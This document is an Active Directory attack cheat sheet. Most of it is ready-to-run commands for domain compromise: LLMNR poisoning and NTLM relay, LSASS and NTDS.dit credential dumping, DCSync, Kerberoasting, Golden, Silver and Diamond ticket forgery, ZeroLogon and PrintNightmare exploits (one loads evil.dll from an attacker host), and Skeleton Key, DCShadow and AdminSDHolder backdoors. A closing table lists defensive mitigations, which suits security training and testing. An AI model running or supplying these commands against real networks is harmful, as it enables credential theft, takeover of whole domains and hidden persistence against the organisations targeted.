Reconnaissance

Before attacking, enumerate users, groups, computers, trusts, SPNs, and permissions. Most recon uses legitimate AD queries — nearly indistinguishable from normal admin activity.

BloodHound / SharpHound Medium
Maps the entire AD environment as a graph. Finds shortest paths to Domain Admin through group memberships, sessions, ACLs, and delegation settings. The single most impactful recon tool in AD.
Commands
# SharpHound collector (run on domain-joined machine) SharpHound.exe -c All SharpHound.exe -c All --stealth SharpHound.exe -c All,GPOLocalGroup --zipfilename results.zip # Remote collection (Linux) bloodhound-python -u user -p pass -d domain.local -ns 10.10.10.1 -c All # In BloodHound GUI — pre-built queries: "Find Shortest Paths to Domain Admins" "Find all Kerberoastable Users" "Find Principals with DCSync Rights" "Shortest Paths to Unconstrained Delegation Systems" "Find Computers where Domain Users are Local Admin"
PowerView / AD module enumeration
# Domain info Get-NetDomain Get-NetDomainController # Users Get-NetUser | select samaccountname,description,pwdlastset Get-NetUser -SPN # Kerberoastable accounts Get-NetUser -PreauthNotRequired # AS-REP roastable # Groups Get-NetGroup "Domain Admins" -Recurse Get-NetLocalGroupMember -ComputerName dc.domain.local # Computers Get-NetComputer -OperatingSystem "*Server*" Find-LocalAdminAccess # Where do I have local admin? # GPOs Get-NetGPO Get-NetGPOGroup # Native Windows commands net user /domain net group "Domain Admins" /domain nltest /domain_trusts whoami /groups
LDAP enumeration
LDAP often allows anonymous or low-privileged queries revealing all users, groups, computers, and policies in the domain.
# ldapsearch ldapsearch -x -H ldap://10.10.10.1 -b "dc=domain,dc=local" "(objectClass=user)" ldapsearch -x -H ldap://10.10.10.1 -b "dc=domain,dc=local" "(objectClass=group)" # enum4linux-ng (full enumeration) enum4linux-ng -A 10.10.10.1 # CrackMapExec cme ldap 10.10.10.1 -u user -p pass --users cme ldap 10.10.10.1 -u user -p pass --groups cme ldap 10.10.10.1 -u user -p pass --password-not-required cme ldap 10.10.10.1 -u user -p pass --admin-count # Enumerate SPNs for Kerberoasting setspn -T domain.local -Q */* GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.1

Credential attacks

LLMNR / NBT-NS Poisoning High
When Windows fails DNS resolution, it falls back to LLMNR (port 5355) and NBT-NS (port 137) broadcasts. Responder answers those broadcasts and captures NTLMv2 hashes from every machine on the subnet trying to resolve a name.
1
Victim tries to reach \\FILESERVER — DNS fails, broadcasts LLMNR query
2
Responder replies "I am FILESERVER" to the broadcast
3
Victim sends NTLMv2 challenge-response to authenticate to the fake server
4
Hash captured — crack offline or relay to another machine for immediate shell
# Run Responder sudo responder -I eth0 -wrf # Crack captured NTLMv2 hash (hashcat mode 5600) hashcat -m 5600 hashes.txt rockyou.txt --force # Or relay instead of cracking (ntlmrelayx) ntlmrelayx.py -tf targets.txt -smb2support ntlmrelayx.py -tf targets.txt -smb2support -i # interactive SMB shell ntlmrelayx.py -tf targets.txt -smb2support -c "cmd" # execute command
Password spraying High
Try one password against many users. Avoids lockout by staying below the threshold (typically 3–5 bad attempts). Most effective with seasonal passwords: Winter2024!, Company@2024, Welcome1.
# CrackMapExec — spray over SMB cme smb 10.10.10.0/24 -u users.txt -p 'Winter2024!' --continue-on-success # Kerbrute — faster, uses Kerberos (less lockout risk) kerbrute passwordspray -d domain.local users.txt 'Winter2024!' # Username enumeration first kerbrute userenum -d domain.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
LSASS credential dumping Critical
LSASS caches plaintext passwords (on older systems), NTLM hashes, and Kerberos tickets in memory. Mimikatz reads directly from the LSASS process.
# Mimikatz — dump all cached credentials privilege::debug sekurlsa::logonpasswords # plaintext + NTLM + Kerberos sekurlsa::msv # NTLM hashes only sekurlsa::wdigest # plaintext (if WDigest enabled) sekurlsa::tickets /export # export Kerberos tickets # Dump LSASS memory via ProcDump (then parse offline) procdump.exe -accepteula -ma lsass.exe lsass.dmp # On attacker machine: sekurlsa::minidump lsass.dmp sekurlsa::logonpasswords # Task Manager → right-click lsass.exe → Create dump file # CrackMapExec cme smb 10.10.10.1 -u admin -p pass -M lsassy
DCSync Critical
Mimics a legitimate DC replication request. Pulls any account's password hash from AD without touching NTDS.dit on disk. Requires "Replicating Directory Changes" permission (held by DAs and delegated accounts).
# Mimikatz — pull specific account hash lsadump::dcsync /user:krbtgt lsadump::dcsync /user:Administrator lsadump::dcsync /all /csv # dump everything # Secretsdump (remote, no agent needed) secretsdump.py domain/admin:pass@dc.domain.local secretsdump.py -hashes :NTLMhash domain/admin@dc.domain.local secretsdump.py -just-dc-ntlm domain/admin:pass@dc.domain.local
NTDS.dit extraction Critical
NTDS.dit on the DC is the entire AD database — every account, every hash. Locked while running, but extractable via Volume Shadow Copies. Then parse offline with secretsdump.
# Create shadow copy (on DC as admin) vssadmin create shadow /for=C: copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\loot\ reg save HKLM\SYSTEM C:\loot\SYSTEM reg save HKLM\SECURITY C:\loot\SECURITY # Parse offline secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL # CrackMapExec (automated) cme smb dc.domain.local -u admin -p pass --ntds

Kerberos attacks

Kerberoasting High
Any domain user can request a TGS (service ticket) for any SPN. The TGS is encrypted with the service account's hash. Request it, extract it, crack offline — completely normal AD behavior, minimal logging.
1
Find accounts with SPNs (service principal names) set
2
Request TGS for those accounts — any domain user can do this
3
Extract the encrypted TGS blob (RC4 or AES encrypted)
4
Crack the hash offline with hashcat using a wordlist
# Impacket GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.1 -request GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.1 -request -outputfile hashes.txt # Rubeus (on Windows) Rubeus.exe kerberoast /outfile:hashes.txt Rubeus.exe kerberoast /user:svcSQL /nowrap Rubeus.exe kerberoast /rc4opsec # request only RC4 (faster crack) # Crack (hashcat) hashcat -m 13100 hashes.txt rockyou.txt # RC4 hashcat -m 19700 hashes.txt rockyou.txt # AES-256 hashcat -m 13100 hashes.txt rockyou.txt -r best64.rule # with rules
AS-REP Roasting High
Accounts with "Do not require Kerberos preauthentication" enabled respond to unauthenticated AS-REQ with an encrypted blob. No valid credentials needed to ask. Blob is crackable offline.
# Impacket (no creds needed) GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.1 # With creds — find all vulnerable accounts GetNPUsers.py domain.local/user:pass -dc-ip 10.10.10.1 -request # Rubeus Rubeus.exe asreproast /nowrap Rubeus.exe asreproast /user:targetuser /nowrap # Crack (hashcat mode 18200) hashcat -m 18200 asrep.txt rockyou.txt hashcat -m 18200 asrep.txt rockyou.txt -r best64.rule
Pass-the-Ticket (PtT) Critical
Steal a Kerberos TGT or TGS from LSASS memory and inject it into your own session. You become the user — no password needed, ticket is already valid.
# Export all tickets from memory (Mimikatz) sekurlsa::tickets /export # saves .kirbi files # Inject ticket into current session kerberos::ptt Administrator@domain.local.kirbi # Rubeus — dump and inject Rubeus.exe dump /luid:0x3e4 /nowrap Rubeus.exe ptt /ticket:base64encodedticket # Verify ticket is loaded klist
Overpass-the-Hash (OPtH) Critical
Use an NTLM hash to get a full Kerberos TGT. Converts NTLM auth to Kerberos — more stealthy in environments that log NTLM usage.
# Mimikatz sekurlsa::pth /user:admin /domain:domain.local /ntlm:NTLMhash /run:powershell.exe # Rubeus — get TGT directly and inject Rubeus.exe asktgt /user:admin /rc4:NTLMhash /domain:domain.local /ptt Rubeus.exe asktgt /user:admin /aes256:AEShash /domain:domain.local /ptt
Golden Ticket Critical
Forge any TGT for any user after obtaining the KRBTGT hash. Valid for 10 years by default. Survives all regular user/admin password resets. The endgame of domain compromise.
1
Get KRBTGT hash via DCSync: lsadump::dcsync /user:krbtgt
2
Get Domain SID: whoami /user — strip the last RID
3
Forge the ticket with Mimikatz and inject it
4
Access any resource in the domain as any user
# Mimikatz kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGThash /ptt # Impacket (Linux) ticketer.py -nthash KRBTGThash -domain-sid S-1-5-21-... -domain domain.local Administrator export KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass domain.local/Administrator@dc.domain.local # With extra SIDs (for forest escalation) kerberos::golden /user:Administrator /domain:child.local /sid:S-1-5-21-childSID /krbtgt:hash /sids:S-1-5-21-rootSID-519 /ptt
Silver Ticket High
Forge a TGS for a specific service using that service account's hash. More targeted than Golden Ticket. Never touches the DC — no KDC logging at all.
# Forge CIFS ticket for fileserver (SMB access) kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:fileserver.domain.local /service:cifs /rc4:ServiceNTLMhash /ptt # Common service targets: # cifs → file shares (SMB) # http → web services / IIS # host → remote management (WMI, PsExec) # ldap → AD queries (DCSync without DA!) # mssql → SQL Server
Diamond Ticket Critical
Stealthier Golden Ticket variant. Requests a real TGT from the KDC, then decrypts and modifies it in memory — the ticket carries a valid KDC signature, defeating PAC validation detections.
# Rubeus Rubeus.exe diamond /krbkey:AES256key /user:lowpriv /password:pass /enctype:aes /ticketuser:Administrator /domain:domain.local /dc:dc.domain.local /ptt

Lateral movement

Pass-the-Hash (PtH) Critical
NTLM authentication accepts a hash directly — the protocol never requires the plaintext password. Dump one hash, authenticate everywhere that account has access.
# CrackMapExec — sweep entire subnet with one hash cme smb 10.10.10.0/24 -u Administrator -H NTLMhash cme smb 10.10.10.0/24 -u Administrator -H NTLMhash --continue-on-success # Execution methods (Impacket) psexec.py -hashes :NTLMhash domain/Administrator@10.10.10.1 # creates service wmiexec.py -hashes :NTLMhash domain/Administrator@10.10.10.1 # WMI — less noisy smbexec.py -hashes :NTLMhash domain/Administrator@10.10.10.1 # no binary dropped atexec.py -hashes :NTLMhash domain/Administrator@10.10.10.1 "whoami" # Mimikatz spawn shell sekurlsa::pth /user:admin /domain:domain.local /ntlm:hash /run:cmd.exe
NTLM Relay Critical
Capture NTLM authentication from Responder/LLMNR poisoning and relay it in real-time to another target. If the relayed account has admin there — instant code execution without cracking anything.
1
Disable SMB/HTTP on attacker machine (Responder.conf: SMB=Off, HTTP=Off)
2
Run ntlmrelayx pointing at targets where SMB signing is disabled
3
Run responder to poison broadcasts — victim's auth flows to attacker
4
ntlmrelayx forwards auth to target → shell or SAM dump
# Find hosts without SMB signing (relay targets) cme smb 10.10.10.0/24 --gen-relay-list targets.txt # Run relay ntlmrelayx.py -tf targets.txt -smb2support ntlmrelayx.py -tf targets.txt -smb2support -i # interactive shell ntlmrelayx.py -tf targets.txt -smb2support -c "whoami" # run command ntlmrelayx.py -tf targets.txt --delegate-access # RBCD attack # Responder (SMB/HTTP off — just capture, don't respond) sudo responder -I eth0 -wrf
Remote execution methods High
# WinRM (port 5985/5986) — most common evil-winrm -i 10.10.10.1 -u admin -p pass evil-winrm -i 10.10.10.1 -u admin -H NTLMhash # PSExec (creates a service — noisy) PsExec.exe \\target -u domain\admin -p pass cmd.exe psexec.py domain/admin:pass@10.10.10.1 # WMI (stealthier) wmiexec.py domain/admin:pass@10.10.10.1 wmic /node:10.10.10.1 /user:admin /password:pass process call create "cmd.exe /c whoami" # RDP xfreerdp /u:admin /p:pass /v:10.10.10.1 +clipboard

Privilege escalation

ZeroLogon — CVE-2020-1472 Critical
Cryptographic flaw in Netlogon's AES-CFB8 implementation. An 8-byte all-zero IV causes ~1-in-256 encryptions to produce all-zero output. Allows resetting the DC machine account password with no credentials — instant full domain compromise.
# Check if vulnerable zerologon_tester.py DCNAME 10.10.10.1 # Exploit (resets DC machine account password to empty) cve-2020-1472-exploit.py DCNAME 10.10.10.1 # DCSync with empty password secretsdump.py -just-dc -no-pass domain/DCNAME\$@10.10.10.1 # RESTORE after exploitation (critical — DC will break otherwise) reinstatepassword.py domain/admin:pass@10.10.10.1 DCNAME machine_account_hash
PrintNightmare — CVE-2021-1675 / CVE-2021-34527 Critical
Windows Print Spooler allows low-privileged users to install printer drivers, which run as SYSTEM. Exploitable locally (LPE) and remotely (RCE). Devastating on DCs where Spooler is running.
# Remote RCE (as SYSTEM on DC) CVE-2021-1675.py domain/user:pass@dc.domain.local '\\attackerIP\share\evil.dll' # Local privilege escalation Import-Module .\CVE-2021-34527.ps1 Invoke-Nightmare -NewUser "backdoor" -NewPassword "Back@123" # Check if vulnerable cme smb 10.10.10.1 -u user -p pass -M printnightmare
Unconstrained delegation abuse Critical
Machines with unconstrained delegation cache the TGT of every user that authenticates to them. Compromise such a machine, then use PrinterBug/PetitPotam to force DC authentication — steal DC's TGT — DCSync — full domain.
# Find machines with unconstrained delegation Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation # Force DC to authenticate to your compromised machine # SpoolSample (PrinterBug) SpoolSample.exe dc.domain.local compromised.domain.local # PetitPotam PetitPotam.py compromised.domain.local dc.domain.local # Monitor for incoming TGTs on compromised machine Rubeus.exe monitor /interval:5 /nowrap # Inject captured DC TGT and run DCSync Rubeus.exe ptt /ticket:base64ticket lsadump::dcsync /user:krbtgt
Constrained delegation (S4U) abuse High
Service accounts with constrained delegation can use S4U2Self + S4U2Proxy to request tickets impersonating any user to allowed services — including Domain Admin.
# Find constrained delegation accounts Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo # Rubeus S4U2 full chain Rubeus.exe s4u /user:svcAccount /rc4:NTLMhash /impersonateuser:Administrator /msdsspn:cifs/server.domain.local /ptt # Impacket getST.py -spn cifs/server.domain.local -impersonate Administrator domain.local/svcAccount:pass
RBCD — Resource-Based Constrained Delegation High
If you can write the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on a computer object (via GenericWrite, GenericAll, WriteDACL), you can make that computer trust a fake machine account you control — then impersonate any user to it.
# Add fake computer account (any user can add up to 10 by default) addcomputer.py -computer-name 'FakePC$' -computer-pass 'Fake@123' domain.local/user:pass # Write RBCD attribute on target computer rbcd.py -f FakePC -t target -dc-ip 10.10.10.1 domain.local/user:pass # Get impersonated service ticket getST.py -spn cifs/target.domain.local -impersonate Administrator domain.local/FakePC\$:Fake@123 # Use ticket export KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass domain.local/Administrator@target.domain.local
GPO abuse High
Write permissions on a GPO that applies to a privileged OU or machine allows executing code as SYSTEM, adding local admins, or deploying persistence across all affected machines.
# Find GPOs you can modify (PowerView) Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.ActiveDirectoryRights -match "Write" -and $_.IdentityReference -match "lowpriv"} # SharpGPOAbuse SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName "Vulnerable GPO" SharpGPOAbuse.exe --AddComputerTask --TaskName "Backdoor" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c net localgroup administrators attacker /add" --GPOName "Vulnerable GPO" # Force immediate GPO refresh gpupdate /force

Persistence techniques

Golden Ticket Critical
The ultimate persistence mechanism. KRBTGT hash + domain SID = forge valid TGTs indefinitely. Survives user password changes, survives admin resets. Only rotating KRBTGT password twice invalidates existing tickets.
kerberos::golden /user:FakeAdmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash /id:500 /groups:512,519 /ptt
Skeleton Key Critical
Patches LSASS on the DC in memory. After patching, every account accepts "mimikatz" as a master password alongside their real password. Invisible in AD — no attribute changes. Does not survive DC reboot.
# Run on the Domain Controller privilege::debug misc::skeleton # Now authenticate as ANY user with password "mimikatz" net use \\dc.domain.local\admin$ /user:domain\Administrator mimikatz Enter-PSSession -ComputerName dc.domain.local -Credential domain\anyuser # password: mimikatz
DCShadow Critical
Registers a rogue Domain Controller using legitimate AD replication APIs. Push arbitrary object changes to AD — SID history injection, group membership, ACL changes — without any events logged on the real DC.
# Terminal 1 — configure the rogue DC and the change lsadump::dcshadow /object:attacker /attribute:primaryGroupID /value:512 # Terminal 2 — trigger replication (push the change) lsadump::dcshadow /push # Other useful DCShadow changes: # Add SID to SIDHistory: /attribute:sidhistory /value:S-1-5-21-rootSID-519 # Set AdminCount: /attribute:admincount /value:1
AdminSDHolder backdoor High
SDProp runs every 60 minutes and resets ACLs on all protected accounts (DA, EA, etc.) to match the AdminSDHolder template. Add yourself to AdminSDHolder's ACL → 60 minutes later you have persistent GenericAll over all DA accounts.
# Add GenericAll for attacker on AdminSDHolder (requires DA) Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity attacker -Rights All -Verbose # Wait 60 min for SDProp, or trigger manually Invoke-ADSDPropagation # Now you have GenericAll on all DA accounts — reset their passwords Set-DomainUserPassword -Identity "Domain Admin" -AccountPassword (ConvertTo-SecureString 'NewP@ss' -AsPlainText -Force)

ACL / permission abuse

Every AD object has an ACL. Misconfigured permissions — often from IT shortcuts or legacy delegation — create invisible attack paths that BloodHound surfaces instantly.

ACL rightTargetWhat an attacker can do
GenericAllAny objectFull control — reset password, add to groups, modify any attribute, take ownership, set SPN.
GenericWriteAny objectWrite any writable attribute. Set SPN (Kerberoast), set logon script, set msDS-AllowedToActOnBehalfOf (RBCD).
WriteDACLAny objectModify the object's ACL — grant yourself GenericAll and do anything.
WriteOwnerAny objectChange the object owner — as owner you implicitly have WriteDACL.
ForceChangePasswordUserReset user's password without knowing the current one. No authentication needed.
AddMemberGroupAdd any principal to the group — add yourself to Domain Admins.
SelfGroupAdd yourself specifically to the group (more limited than AddMember).
AllExtendedRightsUser/DomainIncludes DCSync rights (on domain object) and password reset (on user).
OwnsAny objectObject owner has implicit WriteDACL — chain into GenericAll.
ReadLAPSPasswordComputerRead the LAPS-managed local administrator password in plaintext.
ReadGMSAPasswordgMSA accountRead the Group Managed Service Account password.
Exploiting ACL misconfigurations
# Find dangerous ACLs (PowerView) Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "lowprivuser"} # Reset password (ForceChangePassword / GenericAll on user) Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewP@ss' -AsPlainText -Force) # Add self to group (AddMember / GenericAll on group) Add-DomainGroupMember -Identity "Domain Admins" -Members attacker # Grant DCSync rights (WriteDACL on domain object) Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync # Set SPN for Kerberoasting (GenericWrite on user) Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn.domain.local'} GetUserSPNs.py domain.local/attacker:pass -request # Read LAPS password Get-DomainComputer -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime cme ldap 10.10.10.1 -u user -p pass -M laps

Domain trust attacks

Trust relationships between domains and forests create cross-boundary attack paths. Compromise a child domain → escalate to the forest root.

Trust enumeration
nltest /domain_trusts Get-ADTrust -Filter * Get-DomainTrust # PowerView Get-ForestTrust # PowerView Get-DomainTrustMapping # PowerView — map all trusts recursively
Child-to-parent domain escalation Critical
Each trust has a shared inter-realm trust key. Compromise the child domain → get KRBTGT hash → forge a Golden Ticket with the Enterprise Admins SID (S-1-5-21-rootSID-519) injected into ExtraSids → instant Enterprise Admin on the forest root.
1
Compromise child domain — become DA of child
2
Get child KRBTGT hash and child domain SID
3
Get root domain SID (Enterprise Admins = rootSID-519)
4
Forge Golden Ticket with ExtraSids pointing to EA SID
# Get child KRBTGT hash lsadump::dcsync /user:krbtgt /domain:child.domain.local # Get root SID Get-ADDomain -Identity root.local | select DomainSID # Forge cross-realm Golden Ticket kerberos::golden /user:Administrator /domain:child.domain.local /sid:S-1-5-21-childSID /sids:S-1-5-21-rootSID-519 /krbtgt:childKRBTGThash /ptt # Now access root DC ls \\rootdc.root.local\C$
SID history injection Critical
SID history is used in migrations. An attacker with DA can add any SID (DA, EA, Schema Admins) into a user's SIDHistory attribute — that user silently inherits all privileges of that SID across all trusts.
# Inject high-privilege SID into SID history (DCShadow or Mimikatz) sid::patch sid::add /sam:attacker /new:S-1-5-21-rootSID-512 # Domain Admins of root sid::add /sam:attacker /new:S-1-5-21-rootSID-519 # Enterprise Admins # Or via Golden Ticket ExtraSids field kerberos::golden ... /sids:S-1-5-21-rootSID-519

Defense & mitigations

AttackMitigation
Kerberoasting25+ char passwords on service accounts. Use gMSA. Enable AES — disable RC4. Monitor Event 4769 for RC4 TGS requests from non-service accounts.
AS-REP RoastingDisable "Do not require Kerberos preauthentication" on all accounts. Audit regularly: Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
Pass-the-HashEnable Protected Users group. Credential Guard. Disable NTLM where possible. Tiered admin model — no DA logins on workstations.
LLMNR / NBT-NSDisable LLMNR via GPO. Disable NetBIOS over TCP/IP on all adapters. DNS-only name resolution.
NTLM RelayEnable SMB signing on all machines. Enable LDAP signing + channel binding. Enable EPA. Disable NTLMv1.
Golden TicketRotate KRBTGT password twice (invalidates all tickets). Monitor for tickets with unusually long lifetimes or forged PAC contents.
Silver TicketEnable PAC validation. Rotate service account passwords. Monitor for service tickets with no corresponding TGT request.
DCSyncAudit "Replicating Directory Changes" permissions. Alert on Event 4662 from non-DC machine accounts doing replication.
Skeleton KeyReboot DCs regularly — patch clears it. Virtualization-based security (VBS). Monitor LSASS for unexpected code injection.
DCShadowMonitor for new Domain Controller registrations. Alert on unexpected replication partners. Restrict CreateChild on Sites container.
Unconstrained delegationRemove unconstrained delegation from all non-DC accounts. Use constrained or RBCD instead. Block tools like SpoolSample via firewall.
ACL abuseRegular ACL audits using BloodHound defensively. Remove all unnecessary delegated rights. Alert on AdminSDHolder ACL modifications.
ZeroLogonPatch MS20-1472 immediately. Enable enforcement mode for Secure Channel in Group Policy.
PrintNightmareDisable Print Spooler on all DCs and non-print servers. Patch. Restrict operator access to Spooler.
Password sprayingAccount lockout policy. Azure AD Smart Lockout. Monitor Event 4625 spikes. Strong password policy + MFA.
